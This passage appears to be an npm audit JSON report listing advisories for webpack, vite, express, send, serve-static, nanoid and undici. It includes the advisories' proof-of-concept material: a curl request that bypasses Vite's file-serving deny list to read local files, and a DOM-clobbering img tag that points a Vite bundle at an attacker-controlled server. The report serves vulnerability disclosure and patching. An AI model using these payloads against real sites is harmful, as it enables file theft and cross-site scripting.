use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\?.*$/, \"\").replace(/\\/[^\\/]+$/, \"/\");\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nPlease note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.",
      "reported_by": null,
      "title": "Webpack's AutoPublicPathRuntimeModule has a DOM Clobbering Gadget that leads to XSS",
      "metadata": null,
      "cves": [
        "CVE-2024-43788"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "webpack",
      "vulnerable_versions": ">=5.0.0-alpha.0 <5.94.0",
      "github_advisory_id": "GHSA-4vvj-4cpr-p986",
      "recommendation": "Upgrade to version 5.94.0 or later",
      "patched_versions": ">=5.94.0",
      "updated": "2024-09-03T17:09:21.000Z",
      "cvss": {
        "score": 6.4,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H"
      },
      "cwe": [
        "CWE-79"
      ],
      "url": "https://github.com/advisories/GHSA-4vvj-4cpr-p986"
    },
    "1099687": {
      "findings": [
        {
          "version": "5.1.6",
          "paths": [
            "packages__ui>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx\n- https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249\n- https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34\n- https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd\n- https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6\n- https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7\n- https://nvd.nist.gov/vuln/detail/CVE-2024-45811\n- https://github.com/advisories/GHSA-9cwx-2883-4wfx",
      "created": "2024-09-17T18:44:12.000Z",
      "id": 1099687,
      "npm_advisory_id": null,
      "overview": "### Summary\nThe contents of arbitrary files can be returned to the browser.\n\n### Details\n`@fs` denies access to files outside of Vite serving allow list. Adding `?import&raw` to the URL bypasses this limitation and returns the file content if it exists.\n\n### PoC\n```sh\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" > /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    <body>\n      <h1>403 Restricted</h1>\n      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&raw\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n```\n\n",
      "reported_by": null,
      "title": "Vite's `server.fs.deny` is bypassed when using `?import&raw`",
      "metadata": null,
      "cves": [
        "CVE-2024-45811"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=5.0.0 <=5.1.7",
      "github_advisory_id": "GHSA-9cwx-2883-4wfx",
      "recommendation": "Upgrade to version 5.1.8 or later",
      "patched_versions": ">=5.1.8",
      "updated": "2024-09-19T18:34:34.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
      },
      "cwe": [
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-9cwx-2883-4wfx"
    },
    "1099689": {
      "findings": [
        {
          "version": "5.1.6",
          "paths": [
            "packages__ui>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3\n- https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af\n- https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675\n- https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd\n- https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3\n- https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e\n- https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986\n- https://nvd.nist.gov/vuln/detail/CVE-2024-45812\n- https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad\n- https://research.securitum.com/xss-in-amp4email-dom-clobbering\n- https://scnps.co/papers/sp23_domclob.pdf\n- https://github.com/advisories/GHSA-64vr-g452-qvp3",
      "created": "2024-09-17T19:28:01.000Z",
      "id": 1099689,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.\n\nNote that, we have identified similar security issues in Webpack: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986\n\n### Details\n\n**Backgrounds**\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n**Gadgets found in Vite**\n\nWe have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n```\nconst relativeUrlMechanisms = {\n  amd: (relativePath) => {\n    if (relativePath[0] !== \".\") relativePath = \"./\" + relativePath;\n    return getResolveUrl(\n      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`\n    );\n  },\n  cjs: (relativePath) => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(\n    relativePath\n  )} : ${getRelativeUrlFromDocument(relativePath)})`,\n  es: (relativePath) => getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`\n  ),\n  iife: (relativePath) => getRelativeUrlFromDocument(relativePath),\n  // NOTE: make sure rollup generate `module` params\n  system: (relativePath) => getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`\n  ),\n  umd: (relativePath) => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath(\n    relativePath\n  )} : ${getRelativeUrlFromDocument(relativePath, true)})`\n};\n```\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the Vite to bundle up the program with the following configuration. \n\n```\n// main.js\nimport extraURL from './extra.js?url'\nvar s = document.createElement('script')\ns.src = extraURL\ndocument.head.append(s)\n```\n\n```\n// extra.js\nexport default \"https://myserver/justAnOther.js\"\n```\n\n```\n// vite.config.js\nimport { defineConfig } from 'vite'\n\nexport default defineConfig({\n  build: {\n    assetsInlineLimit: 0, // To avoid inline assets for PoC\n    rollupOptions: {\n      output: {\n        format: \"cjs\"\n      },\n    },\n  },\n  base: \"./\",\n});\n```\n\nAfter running the build command, the developer will get following bundle as the output.\n\n```\n// dist/index-DDmIg9VD.js\n\"use strict\";const t=\"\"+(typeof document>\"u\"?require(\"url\").pathToFileURL(__dirname+\"/extra-BLVEx9Lb.js\").href:new URL(\"extra-BLVEx9Lb.js\",document.currentScript&&document.currentScript.src||document.baseURI).href);var e=document.createElement(\"script\");e.src=t;document.head.append(e);\n```\n\nAdding the Vite bundled script, `dist/index-DDmIg9VD.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Vite Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script type=\"module\" crossorigin src=\"/assets/index-DDmIg9VD.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.\n\n### Patch\n\n```\n// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n  getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', ${\n      umd ? `typeof document === 'undefined' ? location.href : ` : ''\n    }document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`,\n  )\n```",
      "reported_by": null,
      "title": "Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS",
      "metadata": null,
      "cves": [
        "CVE-2024-45812"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=5.0.0 <5.1.8",
      "github_advisory_id": "GHSA-64vr-g452-qvp3",
      "recommendation": "Upgrade to version 5.1.8 or later",
      "patched_versions": ">=5.1.8",
      "updated": "2024-09-19T18:33:22.000Z",
      "cvss": {
        "score": 6.4,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H"
      },
      "cwe": [
        "CWE-79"
      ],
      "url": "https://github.com/advisories/GHSA-64vr-g452-qvp3"
    },
    "1099694": {
      "findings": [
        {
          "version": "4.5.2",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3\n- https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af\n- https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675\n- https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd\n- https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3\n- https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e\n- https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986\n- https://nvd.nist.gov/vuln/detail/CVE-2024-45812\n- https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad\n- https://research.securitum.com/xss-in-amp4email-dom-clobbering\n- https://scnps.co/papers/sp23_domclob.pdf\n- https://github.com/advisories/GHSA-64vr-g452-qvp3",
      "created": "2024-09-17T19:28:01.000Z",
      "id": 1099694,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.\n\nNote that, we have identified similar security issues in Webpack: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986\n\n### Details\n\n**Backgrounds**\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n**Gadgets found in Vite**\n\nWe have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n```\nconst relativeUrlMechanisms = {\n  amd: (relativePath) => {\n    if (relativePath[0] !== \".\") relativePath = \"./\" + relativePath;\n    return getResolveUrl(\n      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`\n    );\n  },\n  cjs: (relativePath) => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(\n    relativePath\n  )} : ${getRelativeUrlFromDocument(relativePath)})`,\n  es: (relativePath) => getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`\n  ),\n  iife: (relativePath) => getRelativeUrlFromDocument(relativePath),\n  // NOTE: make sure rollup generate `module` params\n  system: (relativePath) => getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`\n  ),\n  umd: (relativePath) => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath(\n    relativePath\n  )} : ${getRelativeUrlFromDocument(relativePath, true)})`\n};\n```\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the Vite to bundle up the program with the following configuration. \n\n```\n// main.js\nimport extraURL from './extra.js?url'\nvar s = document.createElement('script')\ns.src = extraURL\ndocument.head.append(s)\n```\n\n```\n// extra.js\nexport default \"https://myserver/justAnOther.js\"\n```\n\n```\n// vite.config.js\nimport { defineConfig } from 'vite'\n\nexport default defineConfig({\n  build: {\n    assetsInlineLimit: 0, // To avoid inline assets for PoC\n    rollupOptions: {\n      output: {\n        format: \"cjs\"\n      },\n    },\n  },\n  base: \"./\",\n});\n```\n\nAfter running the build command, the developer will get following bundle as the output.\n\n```\n// dist/index-DDmIg9VD.js\n\"use strict\";const t=\"\"+(typeof document>\"u\"?require(\"url\").pathToFileURL(__dirname+\"/extra-BLVEx9Lb.js\").href:new URL(\"extra-BLVEx9Lb.js\",document.currentScript&&document.currentScript.src||document.baseURI).href);var e=document.createElement(\"script\");e.src=t;document.head.append(e);\n```\n\nAdding the Vite bundled script, `dist/index-DDmIg9VD.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Vite Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script type=\"module\" crossorigin src=\"/assets/index-DDmIg9VD.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.\n\n### Patch\n\n```\n// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n  getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', ${\n      umd ? `typeof document === 'undefined' ? location.href : ` : ''\n    }document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`,\n  )\n```",
      "reported_by": null,
      "title": "Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS",
      "metadata": null,
      "cves": [
        "CVE-2024-45812"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=4.0.0 <4.5.4",
      "github_advisory_id": "GHSA-64vr-g452-qvp3",
      "recommendation": "Upgrade to version 4.5.4 or later",
      "patched_versions": ">=4.5.4",
      "updated": "2024-09-19T18:33:22.000Z",
      "cvss": {
        "score": 6.4,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H"
      },
      "cwe": [
        "CWE-79"
      ],
      "url": "https://github.com/advisories/GHSA-64vr-g452-qvp3"
    },
    "1099696": {
      "findings": [
        {
          "version": "4.5.2",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx\n- https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249\n- https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34\n- https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd\n- https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6\n- https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7\n- https://nvd.nist.gov/vuln/detail/CVE-2024-45811\n- https://github.com/advisories/GHSA-9cwx-2883-4wfx",
      "created": "2024-09-17T18:44:12.000Z",
      "id": 1099696,
      "npm_advisory_id": null,
      "overview": "### Summary\nThe contents of arbitrary files can be returned to the browser.\n\n### Details\n`@fs` denies access to files outside of Vite serving allow list. Adding `?import&raw` to the URL bypasses this limitation and returns the file content if it exists.\n\n### PoC\n```sh\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" > /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    <body>\n      <h1>403 Restricted</h1>\n      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&raw\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n```\n\n",
      "reported_by": null,
      "title": "Vite's `server.fs.deny` is bypassed when using `?import&raw`",
      "metadata": null,
      "cves": [
        "CVE-2024-45811"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=4.0.0 <=4.5.3",
      "github_advisory_id": "GHSA-9cwx-2883-4wfx",
      "recommendation": "Upgrade to version 4.5.4 or later",
      "patched_versions": ">=4.5.4",
      "updated": "2024-09-19T18:34:34.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
      },
      "cwe": [
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-9cwx-2883-4wfx"
    },
    "1100526": {
      "findings": [
        {
          "version": "0.18.0",
          "paths": [
            "packages__components>express>send"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/pillarjs/send/security/advisories/GHSA-m6fv-jmcg-4jfg\n- https://nvd.nist.gov/vuln/detail/CVE-2024-43799\n- https://github.com/pillarjs/send/commit/ae4f2989491b392ae2ef3b0015a019770ae65d35\n- https://github.com/advisories/GHSA-m6fv-jmcg-4jfg",
      "created": "2024-09-10T19:42:41.000Z",
      "id": 1100526,
      "npm_advisory_id": null,
      "overview": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in send 0.19.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
      "reported_by": null,
      "title": "send vulnerable to template injection that can lead to XSS",
      "metadata": null,
      "cves": [
        "CVE-2024-43799"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "send",
      "vulnerable_versions": "<0.19.0",
      "github_advisory_id": "GHSA-m6fv-jmcg-4jfg",
      "recommendation": "Upgrade to version 0.19.0 or later",
      "patched_versions": ">=0.19.0",
      "updated": "2024-11-18T16:27:12.000Z",
      "cvss": {
        "score": 5,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
      },
      "cwe": [
        "CWE-79"
      ],
      "url": "https://github.com/advisories/GHSA-m6fv-jmcg-4jfg"
    },
    "1100528": {
      "findings": [
        {
          "version": "1.15.0",
          "paths": [
            "packages__components>express>serve-static"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/expressjs/serve-static/security/advisories/GHSA-cm22-4g7w-348p\n- https://nvd.nist.gov/vuln/detail/CVE-2024-43800\n- https://github.com/expressjs/serve-static/commit/0c11fad159898cdc69fd9ab63269b72468ecaf6b\n- https://github.com/expressjs/serve-static/commit/ce730896fddce1588111d9ef6fdf20896de5c6fa\n- https://github.com/advisories/GHSA-cm22-4g7w-348p",
      "created": "2024-09-10T19:42:33.000Z",
      "id": 1100528,
      "npm_advisory_id": null,
      "overview": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in serve-static 1.16.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
      "reported_by": null,
      "title": "serve-static vulnerable to template injection that can lead to XSS",
      "metadata": null,
      "cves": [
        "CVE-2024-43800"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "serve-static",
      "vulnerable_versions": "<1.16.0",
      "github_advisory_id": "GHSA-cm22-4g7w-348p",
      "recommendation": "Upgrade to version 1.16.0 or later",
      "patched_versions": ">=1.16.0",
      "updated": "2024-11-18T16:27:12.000Z",
      "cvss": {
        "score": 5,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
      },
      "cwe": [
        "CWE-79"
      ],
      "url": "https://github.com/advisories/GHSA-cm22-4g7w-348p"
    },
    "1100530": {
      "findings": [
        {
          "version": "4.18.3",
          "paths": [
            "packages__components>express"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/expressjs/express/security/advisories/GHSA-qw6h-vgh9-j6wx\n- https://nvd.nist.gov/vuln/detail/CVE-2024-43796\n- https://github.com/expressjs/express/commit/54271f69b511fea198471e6ff3400ab805d6b553\n- https://github.com/advisories/GHSA-qw6h-vgh9-j6wx",
      "created": "2024-09-10T19:41:04.000Z",
      "id": 1100530,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nIn express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in express 4.20.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
      "reported_by": null,
      "title": "express vulnerable to XSS via response.redirect()",
      "metadata": null,
      "cves": [
        "CVE-2024-43796"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "express",
      "vulnerable_versions": "<4.20.0",
      "github_advisory_id": "GHSA-qw6h-vgh9-j6wx",
      "recommendation": "Upgrade to version 4.20.0 or later",
      "patched_versions": ">=4.20.0",
      "updated": "2024-11-18T16:27:12.000Z",
      "cvss": {
        "score": 5,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
      },
      "cwe": [
        "CWE-79"
      ],
      "url": "https://github.com/advisories/GHSA-qw6h-vgh9-j6wx"
    },
    "1101163": {
      "findings": [
        {
          "version": "3.3.6",
          "paths": [
            "packages__components>@stripe/agent-toolkit>ai>nanoid"
          ]
        },
        {
          "version": "3.3.7",
          "paths": [
            "packages__server>nanoid"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-55565\n- https://github.com/ai/nanoid/pull/510\n- https://github.com/ai/nanoid/compare/3.3.7...3.3.8\n- https://github.com/ai/nanoid/releases/tag/5.0.9\n- https://github.com/advisories/GHSA-mwcw-c2x4-8c55",
      "created": "2024-12-09T03:30:59.000Z",
      "id": 1101163,
      "npm_advisory_id": null,
      "overview": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed.",
      "reported_by": null,
      "title": "Predictable results in nanoid generation when given non-integer values",
      "metadata": null,
      "cves": [
        "CVE-2024-55565"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "nanoid",
      "vulnerable_versions": "<3.3.8",
      "github_advisory_id": "GHSA-mwcw-c2x4-8c55",
      "recommendation": "Upgrade to version 3.3.8 or later",
      "patched_versions": ">=3.3.8",
      "updated": "2024-12-13T22:57:32.000Z",
      "cvss": {
        "score": 4.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
      },
      "cwe": [
        "CWE-835"
      ],
      "url": "https://github.com/advisories/GHSA-mwcw-c2x4-8c55"
    },
    "1101164": {
      "findings": [
        {
          "version": "5.0.7",
          "paths": [
            "packages__components>langwatch>nanoid"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-55565\n- https://github.com/ai/nanoid/pull/510\n- https://github.com/ai/nanoid/compare/3.3.7...3.3.8\n- https://github.com/ai/nanoid/releases/tag/5.0.9\n- https://github.com/advisories/GHSA-mwcw-c2x4-8c55",
      "created": "2024-12-09T03:30:59.000Z",
      "id": 1101164,
      "npm_advisory_id": null,
      "overview": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed.",
      "reported_by": null,
      "title": "Predictable results in nanoid generation when given non-integer values",
      "metadata": null,
      "cves": [
        "CVE-2024-55565"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "nanoid",
      "vulnerable_versions": ">=4.0.0 <5.0.9",
      "github_advisory_id": "GHSA-mwcw-c2x4-8c55",
      "recommendation": "Upgrade to version 5.0.9 or later",
      "patched_versions": ">=5.0.9",
      "updated": "2024-12-13T22:57:32.000Z",
      "cvss": {
        "score": 4.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
      },
      "cwe": [
        "CWE-835"
      ],
      "url": "https://github.com/advisories/GHSA-mwcw-c2x4-8c55"
    },
    "1101610": {
      "findings": [
        {
          "version": "5.28.3",
          "paths": [
            "packages__components>@elastic/elasticsearch>@elastic/transport>undici"
          ]
        },
        {
          "version": "5.28.4",
          "paths": [
            "packages__components>@qdrant/js-client-rest>undici"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-c76h-2ccp-4975\n- https://nvd.nist.gov/vuln/detail/CVE-2025-22150\n- https://github.com/nodejs/undici/commit/711e20772764c29f6622ddc937c63b6eefdf07d0\n- https://github.com/nodejs/undici/commit/c2d78cd19fe4f4c621424491e26ce299e65e934a\n- https://github.com/nodejs/undici/commit/c3acc6050b781b827d80c86cbbab34f14458d385\n- https://hackerone.com/reports/2913312\n- https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f\n- https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113\n- https://github.com/advisories/GHSA-c76h-2ccp-4975",
      "created": "2025-01-21T21:10:47.000Z",
      "id": 1101610,
      "npm_advisory_id": null,
